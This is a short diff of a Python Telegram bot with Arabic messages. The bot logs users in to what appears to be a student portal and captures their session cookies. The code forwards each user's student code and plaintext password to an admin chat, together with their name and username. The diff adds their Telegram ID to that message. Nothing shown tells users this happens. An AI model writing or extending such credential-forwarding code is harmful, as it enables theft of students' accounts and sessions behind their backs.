@@ -64,13 +64,15 @@ def send_sms(message, chat_id, number):
     try:
         
         admin_message = (
-            f"ℹ️ *معلومات المستخدم:*\n"
-            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
-            f"• **كود الطالب:** {number} \n"
-            f"• **كلمة المرور:** {text}\n"
-            f"-------------------------------------\n"
-            f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
-        )
+    f"ℹ️ *معلومات المستخدم:*\n"
+    f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
+    f"• **كود الطالب:** {number} \n"
+    f"• **كلمة المرور:** {text}\n"
+    f"• **ID:** {message.from_user.id}\n"  # إضافة هذا السطر
+    f"-------------------------------------\n"
+    f"📢 *المستخدم {message.from_user.username} قام بإرسال رقم الطالب وكلمة المرور.*"
+)
+
         bot.send_message(admin_chat_id, admin_message)
     except Exception as e:
         error_message = f"❌ خطأ أثناء إرسال الطلب: {str(e)}"
@@ -87,7 +89,7 @@ def send_sms(message, chat_id, number):
             bot.reply_to(message, "تم تسجيل الدخول بنجاح ✅")
             cookies = response.headers["Set-Cookie"]
         else:
-            bot.reply_to(message, "برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌")
+            bot.reply_to(message, "برجاء التأكد من كود الطالب وكلمة المرور ثم أعد المحاولة مرة أخرى ❌.\n (ان كنت تواجة مشكلة في التسجيل يمكنك التواصل مع المطور)⬇️", reply_markup=btn)
             return
 
         # ... (بقية الكود كما هو)
